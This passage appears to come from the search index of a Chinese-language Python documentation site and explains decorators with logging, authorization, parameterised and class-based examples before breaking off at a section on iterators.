printf('\u8c03\u7528(add)\u51fd\u6570\u65f6\u95f4:\uff05s' \uff05time.strftime('%Y-%m-%d %H:%M:%S')) #\u88c5\u9970\u5668 def log(func): def wrapper(): #__name__\u53ef\u4ee5\u83b7\u5f97\u51fd\u6570\u540d\u79f0 printf('\u8c03\u7528\uff05s \u51fd\u6570\u65f6\u95f4:%s' %(func.__name__,time.strftime('%Y-%m-%d %H:%M:%S'))) func() return wrapper add_wrap = log(add) add_wrap() \u8fd0\u884c\u7ed3\u679c\uff1a \u8c03\u7528 add \u51fd\u6570\u65f6\u95f4:2019-01-18 13:33:15 \u8c03\u7528(add)\u51fd\u6570\u65f6\u95f4:2019-01-18 13:33:15 \u4f8b2\uff1a #\u88c5\u9970\u5668 def a_new_decorator(a_func): def wrapTheFunction(): print(\"I am doing some boring work before executing a_func()\") a_func() print(\"I am doing some boring work after executing a_func()\") return wrapTheFunction #\u5b9a\u4e49\u4e00\u4e2a\u65b9\u6cd5 def a_function_requiring_decoration(): print(\"I am the function which needs some decoration to remove my foul smell\") #\u8c03\u7528\u65b9\u6cd5 a_function_requiring_decoration() #\u88c5\u9970\u5668\u88c5\u9970\u65b9\u6cd5 a_function_requiring_decoration = a_new_decorator(a_function_requiring_decoration) #\u8c03\u7528 a_function_requiring_decoration() \u8fd0\u884c\u7ed3\u679c\uff1a #I am the function which needs some decoration to remove my foul smell #I am doing some boring work before executing a_func() #I am the function which needs some decoration to remove my foul smell #I am doing some boring work after executing a_func() \u4f8b2 @\u7684\u65b9\u5f0f\u8c03\u7528\u65b9\u6cd5\uff1a @a_new_decorator def a_function_requiring_decoration(): print(\"I am the function which needs some decoration to remove my foul smell\") a_function_requiring_decoration() #\u4f46\u662f\u67e5\u770b\u51fd\u6570\u540d\u5b57\u5374\u4e0d\u5bf9 a_function_requiring_decoration = a_new_decorator(a_function_requiring_decoration) print(a_function_requiring_decoration.__name__) \u8fd0\u884c\u7ed3\u679c\uff1a #I am doing some boring work before executing a_func() #I am the function which needs some decoration to remove my foul smell #I am doing some boring work after executing a_func() #\u4f46\u662f\u67e5\u770b\u51fd\u6570\u540d\u5b57\u5374\u4e0d\u5bf9 # Output: wrapTheFunction @wraps(a_func) Ouput\u8f93\u51fa\u5e94\u8be5\u662f\"a_function_requiring_decoration\"\u3002\u8fd9\u91cc\u7684\u51fd\u6570\u88abwarpTheFunction\u66ff\u4ee3\u4e86\u3002\u5b83\u91cd\u5199\u4e86\u6211\u4eec\u51fd\u6570\u7684\u540d\u5b57\u548c\u6ce8\u91ca\u6587\u6863(docstring)\u3002\u5e78\u8fd0\u7684\u662fPython\u63d0\u4f9b\u7ed9\u6211\u4eec\u4e00\u4e2a\u7b80\u5355\u7684\u51fd\u6570\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u90a3\u5c31\u662ffunctools.wraps\u3002\u6211\u4eec\u4fee\u6539\u4e0a\u4e00\u4e2a\u4f8b\u5b50\u6765\u4f7f\u7528functools.wraps\uff1a from functools import wraps def a_new_decorator(a_func): @wraps(a_func) def wrapTheFunction(): print(\"I am doing some boring work before executing a_func()\") a_func() print(\"I am doing some boring work after executing a_func()\") return wrapTheFunction @a_new_decorator def a_function_requiring_decoration(): print(\"I am the function which needs some decoration to remove my foul smell\") print(a_function_requiring_decoration.__name__) # Output: a_function_requiring_decoration \u6a21\u677f\uff1a from functools import wraps def decorator_name(f): @wraps(f) def decorated(*args, **kwargs): if not can_run: return \"Function will not run\" return f(*args, **kwargs) return decorated @decorator_name def func(): return(\"Function is running\") can_run = True print(func()) # Output: Function is running can_run = False print(func()) # Output: Function will not run \u6388\u6743(Authorization) \u88c5\u9970\u5668\u80fd\u6709\u52a9\u4e8e\u68c0\u67e5\u67d0\u4e2a\u4eba\u662f\u5426\u88ab\u6388\u6743\u53bb\u4f7f\u7528\u4e00\u4e2aweb\u5e94\u7528\u7684\u7aef\u70b9(endpoint)\u3002\u5b83\u4eec\u88ab\u5927\u91cf\u4f7f\u7528\u4e8eFlask\u548cDjango web\u6846\u67b6\u4e2d\u3002\u8fd9\u91cc\u662f\u4e00\u4e2a\u4f8b\u5b50\u6765\u4f7f\u7528\u57fa\u4e8e\u88c5\u9970\u5668\u7684\u6388\u6743\uff1a from functools import wraps def requires_auth(f): @wraps(f) def decorated(*args, **kwargs): auth = request.authorization if not auth or not check_auth(auth.username, auth.password): authenticate() return f(*args, **kwargs) return decorated \u65e5\u5fd7(Logging) \u65e5\u5fd7\u662f\u88c5\u9970\u5668\u8fd0\u7528\u7684\u53e6\u4e00\u4e2a\u4eae\u70b9\u3002\u8fd9\u662f\u4e2a\u4f8b\u5b50\uff1a from functools import wraps def logit(func): @wraps(func) def with_logging(*args, **kwargs): print(func.__name__ + \" was called\") return func(*args, **kwargs) return with_logging @logit def addition_func(x): \"\"\"Do some math.\"\"\" return x + x result = addition_func(4) # Output: addition_func was called \u5e26\u53c2\u6570\u7684\u88c5\u9970\u5668 \u6765\u60f3\u60f3\u8fd9\u4e2a\u95ee\u9898\uff0c\u96be\u9053@wraps\u4e0d\u4e5f\u662f\u4e2a\u88c5\u9970\u5668\u5417\uff1f\u4f46\u662f\uff0c\u5b83\u63a5\u6536\u4e00\u4e2a\u53c2\u6570\uff0c\u5c31\u50cf\u4efb\u4f55\u666e\u901a\u7684\u51fd\u6570\u80fd\u505a\u7684\u90a3\u6837\u3002\u90a3\u4e48\uff0c\u4e3a\u4ec0\u4e48\u6211\u4eec\u4e0d\u4e5f\u90a3\u6837\u505a\u5462\uff1f \u8fd9\u662f\u56e0\u4e3a\uff0c\u5f53\u4f60\u4f7f\u7528@my_decorator\u8bed\u6cd5\u65f6\uff0c\u4f60\u662f\u5728\u5e94\u7528\u4e00\u4e2a\u4ee5\u5355\u4e2a\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\u7684\u4e00\u4e2a\u5305\u88f9\u51fd\u6570\u3002\u8bb0\u4f4f\uff0cPython\u91cc\u6bcf\u4e2a\u4e1c\u897f\u90fd\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u800c\u4e14\u8fd9\u5305\u62ec\u51fd\u6570\uff01\u8bb0\u4f4f\u4e86\u8fd9\u4e9b\uff0c\u6211\u4eec\u53ef\u4ee5\u7f16\u5199\u4e00\u4e0b\u80fd\u8fd4\u56de\u4e00\u4e2a\u5305\u88f9\u51fd\u6570\u7684\u51fd\u6570\u3002 \u5728\u51fd\u6570\u4e2d\u5d4c\u5165\u88c5\u9970\u5668 \u6211\u4eec\u56de\u5230\u65e5\u5fd7\u7684\u4f8b\u5b50\uff0c\u5e76\u521b\u5efa\u4e00\u4e2a\u5305\u88f9\u51fd\u6570\uff0c\u80fd\u8ba9\u6211\u4eec\u6307\u5b9a\u4e00\u4e2a\u7528\u4e8e\u8f93\u51fa\u7684\u65e5\u5fd7\u6587\u4ef6\u3002 from functools import wraps def logit(logfile='out.log'): def logging_decorator(func): @wraps(func) def wrapped_function(*args, **kwargs): log_string = func.__name__ + \" was called\" print(log_string) # \u6253\u5f00logfile\uff0c\u5e76\u5199\u5165\u5185\u5bb9 with open(logfile, 'a') as opened_file: # \u73b0\u5728\u5c06\u65e5\u5fd7\u6253\u5230\u6307\u5b9a\u7684logfile opened_file.write(log_string + '\\n') return func(*args, **kwargs) return wrapped_function return logging_decorator @logit() def myfunc1(): pass myfunc1() # Output: myfunc1 was called # \u73b0\u5728\u4e00\u4e2a\u53eb\u505a out.log \u7684\u6587\u4ef6\u51fa\u73b0\u4e86\uff0c\u91cc\u9762\u7684\u5185\u5bb9\u5c31\u662f\u4e0a\u9762\u7684\u5b57\u7b26\u4e32 @logit(logfile='func2.log') def myfunc2(): pass myfunc2() # Output: myfunc2 was called # \u73b0\u5728\u4e00\u4e2a\u53eb\u505a func2.log \u7684\u6587\u4ef6\u51fa\u73b0\u4e86\uff0c\u91cc\u9762\u7684\u5185\u5bb9\u5c31\u662f\u4e0a\u9762\u7684\u5b57\u7b26\u4e32 \u88c5\u9970\u5668\u7c7b \u73b0\u5728\u6211\u4eec\u6709\u4e86\u80fd\u7528\u4e8e\u6b63\u5f0f\u73af\u5883\u7684 logit \u88c5\u9970\u5668\uff0c\u4f46\u5f53\u6211\u4eec\u7684\u5e94\u7528\u7684\u67d0\u4e9b\u90e8\u5206\u8fd8\u6bd4\u8f83\u8106\u5f31\u65f6\uff0c\u5f02\u5e38\u4e5f\u8bb8\u662f\u9700\u8981\u66f4\u7d27\u6025\u5173\u6ce8\u7684\u4e8b\u60c5\u3002\u6bd4\u65b9\u8bf4\u6709\u65f6\u4f60\u53ea\u60f3\u6253\u65e5\u5fd7\u5230\u4e00\u4e2a\u6587\u4ef6\u3002\u800c\u6709\u65f6\u4f60\u60f3\u628a\u5f15\u8d77\u4f60\u6ce8\u610f\u7684\u95ee\u9898\u53d1\u9001\u5230\u4e00\u4e2aemail\uff0c\u540c\u65f6\u4e5f\u4fdd\u7559\u65e5\u5fd7\uff0c\u7559\u4e2a\u8bb0\u5f55\u3002\u8fd9\u662f\u4e00\u4e2a\u4f7f\u7528\u7ee7\u627f\u7684\u573a\u666f\uff0c\u4f46\u76ee\u524d\u4e3a\u6b62\u6211\u4eec\u53ea\u770b\u5230\u8fc7\u7528\u6765\u6784\u5efa\u88c5\u9970\u5668\u7684\u51fd\u6570\u3002 \u5e78\u8fd0\u7684\u662f\uff0c\u7c7b\u4e5f\u53ef\u4ee5\u7528\u6765\u6784\u5efa\u88c5\u9970\u5668\u3002\u90a3\u6211\u4eec\u73b0\u5728\u4ee5\u4e00\u4e2a\u7c7b\u800c\u4e0d\u662f\u4e00\u4e2a\u51fd\u6570\u7684\u65b9\u5f0f\uff0c\u6765\u91cd\u65b0\u6784\u5efa logit \u3002 class logit(object): _logfile = 'out.log' def __init__(self, func): self.func = func def __call__(self, *args): log_string = self.func.__name__ + \" was called\" print(log_string) # \u6253\u5f00logfile\u5e76\u5199\u5165 with open(self._logfile, 'a') as opened_file: # \u73b0\u5728\u5c06\u65e5\u5fd7\u6253\u5230\u6307\u5b9a\u7684\u6587\u4ef6 opened_file.write(log_string + '\\n') # \u73b0\u5728\uff0c\u53d1\u9001\u4e00\u4e2a\u901a\u77e5 self.notify() # return base func return self.func(*args) def notify(self): # logit\u53ea\u6253\u65e5\u5fd7\uff0c\u4e0d\u505a\u522b\u7684 pass \u8fd9\u4e2a\u5b9e\u73b0\u6709\u4e00\u4e2a\u9644\u52a0\u4f18\u52bf\uff0c\u5728\u4e8e\u6bd4\u5d4c\u5957\u51fd\u6570\u7684\u65b9\u5f0f\u66f4\u52a0\u6574\u6d01\uff0c\u800c\u4e14\u5305\u88f9\u4e00\u4e2a\u51fd\u6570\u8fd8\u662f\u4f7f\u7528\u8ddf\u4ee5\u524d\u4e00\u6837\u7684\u8bed\u6cd5\uff1a logit._logfile = 'out2.log' # \u5982\u679c\u9700\u8981\u4fee\u6539log\u6587\u4ef6\u53c2\u6570 @logit def myfunc1(): pass myfunc1() # \u8f93\u51fa: myfunc1 was called \u73b0\u5728\uff0c\u6211\u4eec\u7ed9 logit \u521b\u5efa\u5b50\u7c7b\uff0c\u6765\u6dfb\u52a0email\u7684\u529f\u80fd(\u867d\u7136email\u8fd9\u4e2a\u8bdd\u9898\u4e0d\u4f1a\u5728\u8fd9\u91cc\u5c55\u5f00)\u3002 class email_logit(logit): ''' \u4e00\u4e2alogit\u7684\u5b9e\u73b0\u7248\u672c\uff0c\u53ef\u4ee5\u5728\u51fd\u6570\u8c03\u7528\u65f6\u53d1\u9001email\u7ed9\u7ba1\u7406\u5458 ''' def __init__(self, email='admin@myproject.com', *args, **kwargs): self.email = email super(email_logit, self).__init__(*args, **kwargs) def notify(self): # \u53d1\u9001\u4e00\u5c01email\u5230self.email # \u8fd9\u91cc\u5c31\u4e0d\u505a\u5b9e\u73b0\u4e86 pass \u4ece\u73b0\u5728\u8d77\uff0c @email_logit \u5c06\u4f1a\u548c @logit \u4ea7\u751f\u540c\u6837\u7684\u6548\u679c\uff0c\u4f46\u662f\u5728\u6253\u65e5\u5fd7\u7684\u57fa\u7840\u4e0a\uff0c\u8fd8\u4f1a\u591a\u53d1\u9001\u4e00\u5c01\u90ae\u4ef6\u7ed9\u7ba1\u7406\u5458\u3002","title":"python\u88c5\u9970\u5668"},{"location":"programming_language/python/%E8%A3%85%E9%A5%B0%E5%99%A8/#_1","text":"\u88c5\u9970\u5668\u672c\u8d28\u4e0a\u662f\u4e00\u4e2aPython\u51fd\u6570\uff0c\u5b83\u53ef\u4ee5\u8ba9\u5176\u4ed6\u51fd\u6570\u5728\u4e0d\u9700\u8981\u505a\u4efb\u4f55\u4ee3\u7801\u53d8\u52a8\u7684\u524d\u63d0\u4e0b\u589e\u52a0\u989d\u5916\u529f\u80fd\uff0c\u63d0\u9ad8\u4e86\u4ee3\u7801\u7684\u590d\u7528\u6027\u3002\u88c5\u9970\u5668\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u5b83\u63a5\u6536\u4e00\u4e2a\u51fd\u6570\u8fd4\u56de\u53e6\u4e00\u4e2a\u51fd\u6570\u3002\u88c5\u9970\u5668\u4e3b\u8981\u6709\u4ee5\u4e0b\u529f\u80fd\uff1a \u5f15\u5165\u65e5\u5fd7\u3002 \u51fd\u6570\u6267\u884c\u65f6\u95f4\u7edf\u8ba1\u3002 \u6267\u884c\u51fd\u6570\u524d\u9884\u5907\u5904\u7406\u3002 \u6267\u884c\u51fd\u6570\u540e\u7684\u6e05\u7406\u529f\u80fd\u3002 \u6743\u9650\u6821\u9a8c\u7b49\u573a\u666f\u3002 \u7f13\u5b58 \u88c5\u9970\u5668\u5176\u5b9e\u5c31\u662f\u4e00\u4e2a\u4ee5\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\u5e76\u8fd4\u56de\u4e00\u4e2a\u66ff\u6362\u51fd\u6570\u7684\u53ef\u6267\u884c\u51fd\u6570\u3002\u5728\u4e0d\u6539\u52a8\u539f\u51fd\u6570\u4ee3\u7801\u7684\u60c5 \u51b5\u4e0b\uff0c\u4e3a\u5176\u589e\u52a0\u65b0\u7684\u529f\u80fd\u3002","title":"\u88c5\u9970\u5668"},{"location":"programming_language/python/%E8%A3%85%E9%A5%B0%E5%99%A8/#1","text":"import time import fimctools def add(): printf('\u8c03\u7528(add)\u51fd\u6570\u65f6\u95f4:\uff05s' \uff05time.strftime('%Y-%m-%d %H:%M:%S')) #\u88c5\u9970\u5668 def log(func): def wrapper(): #__name__\u53ef\u4ee5\u83b7\u5f97\u51fd\u6570\u540d\u79f0 printf('\u8c03\u7528\uff05s \u51fd\u6570\u65f6\u95f4:%s' %(func.__name__,time.strftime('%Y-%m-%d %H:%M:%S'))) func() return wrapper add_wrap = log(add) add_wrap() \u8fd0\u884c\u7ed3\u679c\uff1a \u8c03\u7528 add \u51fd\u6570\u65f6\u95f4:2019-01-18 13:33:15 \u8c03\u7528(add)\u51fd\u6570\u65f6\u95f4:2019-01-18 13:33:15","title":"\u4f8b1\uff1a"},{"location":"programming_language/python/%E8%A3%85%E9%A5%B0%E5%99%A8/#2","text":"#\u88c5\u9970\u5668 def a_new_decorator(a_func): def wrapTheFunction(): print(\"I am doing some boring work before executing a_func()\") a_func() print(\"I am doing some boring work after executing a_func()\") return wrapTheFunction #\u5b9a\u4e49\u4e00\u4e2a\u65b9\u6cd5 def a_function_requiring_decoration(): print(\"I am the function which needs some decoration to remove my foul smell\") #\u8c03\u7528\u65b9\u6cd5 a_function_requiring_decoration() #\u88c5\u9970\u5668\u88c5\u9970\u65b9\u6cd5 a_function_requiring_decoration = a_new_decorator(a_function_requiring_decoration) #\u8c03\u7528 a_function_requiring_decoration() \u8fd0\u884c\u7ed3\u679c\uff1a #I am the function which needs some decoration to remove my foul smell #I am doing some boring work before executing a_func() #I am the function which needs some decoration to remove my foul smell #I am doing some boring work after executing a_func()","title":"\u4f8b2\uff1a"},{"location":"programming_language/python/%E8%A3%85%E9%A5%B0%E5%99%A8/#2_1","text":"@a_new_decorator def a_function_requiring_decoration(): print(\"I am the function which needs some decoration to remove my foul smell\") a_function_requiring_decoration() #\u4f46\u662f\u67e5\u770b\u51fd\u6570\u540d\u5b57\u5374\u4e0d\u5bf9 a_function_requiring_decoration = a_new_decorator(a_function_requiring_decoration) print(a_function_requiring_decoration.__name__) \u8fd0\u884c\u7ed3\u679c\uff1a #I am doing some boring work before executing a_func() #I am the function which needs some decoration to remove my foul smell #I am doing some boring work after executing a_func() #\u4f46\u662f\u67e5\u770b\u51fd\u6570\u540d\u5b57\u5374\u4e0d\u5bf9 # Output: wrapTheFunction","title":"\u4f8b2 @\u7684\u65b9\u5f0f\u8c03\u7528\u65b9\u6cd5\uff1a"},{"location":"programming_language/python/%E8%A3%85%E9%A5%B0%E5%99%A8/#wrapsa_func","text":"Ouput\u8f93\u51fa\u5e94\u8be5\u662f\"a_function_requiring_decoration\"\u3002\u8fd9\u91cc\u7684\u51fd\u6570\u88abwarpTheFunction\u66ff\u4ee3\u4e86\u3002\u5b83\u91cd\u5199\u4e86\u6211\u4eec\u51fd\u6570\u7684\u540d\u5b57\u548c\u6ce8\u91ca\u6587\u6863(docstring)\u3002\u5e78\u8fd0\u7684\u662fPython\u63d0\u4f9b\u7ed9\u6211\u4eec\u4e00\u4e2a\u7b80\u5355\u7684\u51fd\u6570\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u90a3\u5c31\u662ffunctools.wraps\u3002\u6211\u4eec\u4fee\u6539\u4e0a\u4e00\u4e2a\u4f8b\u5b50\u6765\u4f7f\u7528functools.wraps\uff1a from functools import wraps def a_new_decorator(a_func): @wraps(a_func) def wrapTheFunction(): print(\"I am doing some boring work before executing a_func()\") a_func() print(\"I am doing some boring work after executing a_func()\") return wrapTheFunction @a_new_decorator def a_function_requiring_decoration(): print(\"I am the function which needs some decoration to remove my foul smell\") print(a_function_requiring_decoration.__name__) # Output: a_function_requiring_decoration","title":"@wraps(a_func)"},{"location":"programming_language/python/%E8%A3%85%E9%A5%B0%E5%99%A8/#_2","text":"from functools import wraps def decorator_name(f): @wraps(f) def decorated(*args, **kwargs): if not can_run: return \"Function will not run\" return f(*args, **kwargs) return decorated @decorator_name def func(): return(\"Function is running\") can_run = True print(func()) # Output: Function is running can_run = False print(func()) # Output: Function will not run","title":"\u6a21\u677f\uff1a"},{"location":"programming_language/python/%E8%A3%85%E9%A5%B0%E5%99%A8/#authorization","text":"\u88c5\u9970\u5668\u80fd\u6709\u52a9\u4e8e\u68c0\u67e5\u67d0\u4e2a\u4eba\u662f\u5426\u88ab\u6388\u6743\u53bb\u4f7f\u7528\u4e00\u4e2aweb\u5e94\u7528\u7684\u7aef\u70b9(endpoint)\u3002\u5b83\u4eec\u88ab\u5927\u91cf\u4f7f\u7528\u4e8eFlask\u548cDjango web\u6846\u67b6\u4e2d\u3002\u8fd9\u91cc\u662f\u4e00\u4e2a\u4f8b\u5b50\u6765\u4f7f\u7528\u57fa\u4e8e\u88c5\u9970\u5668\u7684\u6388\u6743\uff1a from functools import wraps def requires_auth(f): @wraps(f) def decorated(*args, **kwargs): auth = request.authorization if not auth or not check_auth(auth.username, auth.password): authenticate() return f(*args, **kwargs) return decorated","title":"\u6388\u6743(Authorization)"},{"location":"programming_language/python/%E8%A3%85%E9%A5%B0%E5%99%A8/#logging","text":"\u65e5\u5fd7\u662f\u88c5\u9970\u5668\u8fd0\u7528\u7684\u53e6\u4e00\u4e2a\u4eae\u70b9\u3002\u8fd9\u662f\u4e2a\u4f8b\u5b50\uff1a from functools import wraps def logit(func): @wraps(func) def with_logging(*args, **kwargs): print(func.__name__ + \" was called\") return func(*args, **kwargs) return with_logging @logit def addition_func(x): \"\"\"Do some math.\"\"\" return x + x result = addition_func(4) # Output: addition_func was called","title":"\u65e5\u5fd7(Logging)"},{"location":"programming_language/python/%E8%A3%85%E9%A5%B0%E5%99%A8/#_3","text":"\u6765\u60f3\u60f3\u8fd9\u4e2a\u95ee\u9898\uff0c\u96be\u9053@wraps\u4e0d\u4e5f\u662f\u4e2a\u88c5\u9970\u5668\u5417\uff1f\u4f46\u662f\uff0c\u5b83\u63a5\u6536\u4e00\u4e2a\u53c2\u6570\uff0c\u5c31\u50cf\u4efb\u4f55\u666e\u901a\u7684\u51fd\u6570\u80fd\u505a\u7684\u90a3\u6837\u3002\u90a3\u4e48\uff0c\u4e3a\u4ec0\u4e48\u6211\u4eec\u4e0d\u4e5f\u90a3\u6837\u505a\u5462\uff1f \u8fd9\u662f\u56e0\u4e3a\uff0c\u5f53\u4f60\u4f7f\u7528@my_decorator\u8bed\u6cd5\u65f6\uff0c\u4f60\u662f\u5728\u5e94\u7528\u4e00\u4e2a\u4ee5\u5355\u4e2a\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\u7684\u4e00\u4e2a\u5305\u88f9\u51fd\u6570\u3002\u8bb0\u4f4f\uff0cPython\u91cc\u6bcf\u4e2a\u4e1c\u897f\u90fd\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u800c\u4e14\u8fd9\u5305\u62ec\u51fd\u6570\uff01\u8bb0\u4f4f\u4e86\u8fd9\u4e9b\uff0c\u6211\u4eec\u53ef\u4ee5\u7f16\u5199\u4e00\u4e0b\u80fd\u8fd4\u56de\u4e00\u4e2a\u5305\u88f9\u51fd\u6570\u7684\u51fd\u6570\u3002","title":"\u5e26\u53c2\u6570\u7684\u88c5\u9970\u5668"},{"location":"programming_language/python/%E8%A3%85%E9%A5%B0%E5%99%A8/#_4","text":"\u6211\u4eec\u56de\u5230\u65e5\u5fd7\u7684\u4f8b\u5b50\uff0c\u5e76\u521b\u5efa\u4e00\u4e2a\u5305\u88f9\u51fd\u6570\uff0c\u80fd\u8ba9\u6211\u4eec\u6307\u5b9a\u4e00\u4e2a\u7528\u4e8e\u8f93\u51fa\u7684\u65e5\u5fd7\u6587\u4ef6\u3002 from functools import wraps def logit(logfile='out.log'): def logging_decorator(func): @wraps(func) def wrapped_function(*args, **kwargs): log_string = func.__name__ + \" was called\" print(log_string) # \u6253\u5f00logfile\uff0c\u5e76\u5199\u5165\u5185\u5bb9 with open(logfile, 'a') as opened_file: # \u73b0\u5728\u5c06\u65e5\u5fd7\u6253\u5230\u6307\u5b9a\u7684logfile opened_file.write(log_string + '\\n') return func(*args, **kwargs) return wrapped_function return logging_decorator @logit() def myfunc1(): pass myfunc1() # Output: myfunc1 was called # \u73b0\u5728\u4e00\u4e2a\u53eb\u505a out.log \u7684\u6587\u4ef6\u51fa\u73b0\u4e86\uff0c\u91cc\u9762\u7684\u5185\u5bb9\u5c31\u662f\u4e0a\u9762\u7684\u5b57\u7b26\u4e32 @logit(logfile='func2.log') def myfunc2(): pass myfunc2() # Output: myfunc2 was called # \u73b0\u5728\u4e00\u4e2a\u53eb\u505a func2.log \u7684\u6587\u4ef6\u51fa\u73b0\u4e86\uff0c\u91cc\u9762\u7684\u5185\u5bb9\u5c31\u662f\u4e0a\u9762\u7684\u5b57\u7b26\u4e32","title":"\u5728\u51fd\u6570\u4e2d\u5d4c\u5165\u88c5\u9970\u5668"},{"location":"programming_language/python/%E8%A3%85%E9%A5%B0%E5%99%A8/#_5","text":"\u73b0\u5728\u6211\u4eec\u6709\u4e86\u80fd\u7528\u4e8e\u6b63\u5f0f\u73af\u5883\u7684 logit \u88c5\u9970\u5668\uff0c\u4f46\u5f53\u6211\u4eec\u7684\u5e94\u7528\u7684\u67d0\u4e9b\u90e8\u5206\u8fd8\u6bd4\u8f83\u8106\u5f31\u65f6\uff0c\u5f02\u5e38\u4e5f\u8bb8\u662f\u9700\u8981\u66f4\u7d27\u6025\u5173\u6ce8\u7684\u4e8b\u60c5\u3002\u6bd4\u65b9\u8bf4\u6709\u65f6\u4f60\u53ea\u60f3\u6253\u65e5\u5fd7\u5230\u4e00\u4e2a\u6587\u4ef6\u3002\u800c\u6709\u65f6\u4f60\u60f3\u628a\u5f15\u8d77\u4f60\u6ce8\u610f\u7684\u95ee\u9898\u53d1\u9001\u5230\u4e00\u4e2aemail\uff0c\u540c\u65f6\u4e5f\u4fdd\u7559\u65e5\u5fd7\uff0c\u7559\u4e2a\u8bb0\u5f55\u3002\u8fd9\u662f\u4e00\u4e2a\u4f7f\u7528\u7ee7\u627f\u7684\u573a\u666f\uff0c\u4f46\u76ee\u524d\u4e3a\u6b62\u6211\u4eec\u53ea\u770b\u5230\u8fc7\u7528\u6765\u6784\u5efa\u88c5\u9970\u5668\u7684\u51fd\u6570\u3002 \u5e78\u8fd0\u7684\u662f\uff0c\u7c7b\u4e5f\u53ef\u4ee5\u7528\u6765\u6784\u5efa\u88c5\u9970\u5668\u3002\u90a3\u6211\u4eec\u73b0\u5728\u4ee5\u4e00\u4e2a\u7c7b\u800c\u4e0d\u662f\u4e00\u4e2a\u51fd\u6570\u7684\u65b9\u5f0f\uff0c\u6765\u91cd\u65b0\u6784\u5efa logit \u3002 class logit(object): _logfile = 'out.log' def __init__(self, func): self.func = func def __call__(self, *args): log_string = self.func.__name__ + \" was called\" print(log_string) # \u6253\u5f00logfile\u5e76\u5199\u5165 with open(self._logfile, 'a') as opened_file: # \u73b0\u5728\u5c06\u65e5\u5fd7\u6253\u5230\u6307\u5b9a\u7684\u6587\u4ef6 opened_file.write(log_string + '\\n') # \u73b0\u5728\uff0c\u53d1\u9001\u4e00\u4e2a\u901a\u77e5 self.notify() # return base func return self.func(*args) def notify(self): # logit\u53ea\u6253\u65e5\u5fd7\uff0c\u4e0d\u505a\u522b\u7684 pass \u8fd9\u4e2a\u5b9e\u73b0\u6709\u4e00\u4e2a\u9644\u52a0\u4f18\u52bf\uff0c\u5728\u4e8e\u6bd4\u5d4c\u5957\u51fd\u6570\u7684\u65b9\u5f0f\u66f4\u52a0\u6574\u6d01\uff0c\u800c\u4e14\u5305\u88f9\u4e00\u4e2a\u51fd\u6570\u8fd8\u662f\u4f7f\u7528\u8ddf\u4ee5\u524d\u4e00\u6837\u7684\u8bed\u6cd5\uff1a logit._logfile = 'out2.log' # \u5982\u679c\u9700\u8981\u4fee\u6539log\u6587\u4ef6\u53c2\u6570 @logit def myfunc1(): pass myfunc1() # \u8f93\u51fa: myfunc1 was called \u73b0\u5728\uff0c\u6211\u4eec\u7ed9 logit \u521b\u5efa\u5b50\u7c7b\uff0c\u6765\u6dfb\u52a0email\u7684\u529f\u80fd(\u867d\u7136email\u8fd9\u4e2a\u8bdd\u9898\u4e0d\u4f1a\u5728\u8fd9\u91cc\u5c55\u5f00)\u3002 class email_logit(logit): ''' \u4e00\u4e2alogit\u7684\u5b9e\u73b0\u7248\u672c\uff0c\u53ef\u4ee5\u5728\u51fd\u6570\u8c03\u7528\u65f6\u53d1\u9001email\u7ed9\u7ba1\u7406\u5458 ''' def __init__(self, email='admin@myproject.com', *args, **kwargs): self.email = email super(email_logit, self).__init__(*args, **kwargs) def notify(self): # \u53d1\u9001\u4e00\u5c01email\u5230self.email # \u8fd9\u91cc\u5c31\u4e0d\u505a\u5b9e\u73b0\u4e86 pass \u4ece\u73b0\u5728\u8d77\uff0c @email_logit \u5c06\u4f1a\u548c @logit \u4ea7\u751f\u540c\u6837\u7684\u6548\u679c\uff0c\u4f46\u662f\u5728\u6253\u65e5\u5fd7\u7684\u57fa\u7840\u4e0a\uff0c\u8fd8\u4f1a\u591a\u53d1\u9001\u4e00\u5c01\u90ae\u4ef6\u7ed9\u7ba1\u7406\u5458\u3002","title":"\u88c5\u9970\u5668\u7c7b"},{"location":"programming_language/python/%E8%BF%AD%E4%BB%A3%E5%99%A8/","text":"Python\u7684\u8fed\u4ee3\u5668(Iterator) \u8fed\u4ee3\u662fPython\u6700\u5f3a\u5927\u7684\u529f\u80fd\u4e4b\u4e00\uff0c\u662f\u5e38\u7528\u7684\u8bbf\u95ee\u96c6\u5408\u5143\u7d20\u7684\u4e00\u79cd\u65b9\u5f0f\u3002\u53ef\u4ee5\u88abnext()\u51fd\u6570\u8c03\u7528\u5e76\u4e0d\u65ad\u8fd4\u56de\u4e0b\u4e00\u4e2a\u503c\u7684\u5bf9\u8c61\u3002\u8fed\u4ee3\u5668\u662f\u4e00\u4e2a\u53ef\u4ee5\u8bb0\u4f4f\u904d\u5386\u7684\u4f4d\u7f6e\u7684\u5bf9\u8c61\u3002Iterator\u5bf9\u8c61\u8868\u793a\u7684\u662f\u4e00\u4e2a\u6570\u636e\u6d41\uff0c \u53ef\u4ee5\u88ab\u770b\u4f5c\u4e3a\u4e00\u4e2a\u6709\u5e8f\u5e8f\u5217\uff0c\u4f46\u662f\u4e0d\u80fd\u63d0\u524d\u5f97\u5230\u5b83\u7684\u957f\u5ea6\uff0c\u53ea\u6709\u5728\u9700\u8981\u8fd4\u56de\u4e0b\u4e00\u4e2a\u6570\u636e\u65f6\u5b83\u624d\u4f1a\u8ba1\u7b97\uff0c \u5b83\u53ef\u4ee5\u88abnext()\u3002\u51fd\u6570\u8c03\u7528\u5e76\u4e0d\u65ad\u8fd4\u56de\u4e0b\u4e00\u4e2a\u6570\u636e\uff0c\u76f4\u5230\u6ca1\u6709\u6570\u636e\u65f6\u629b\u51faStopiteration\u9519\u8bef\u3002 \u8fed\u4ee3\u5668\u6709\u4ee5\u4e0b\u51e0\u4e2a\u7279\u70b9\uff1a 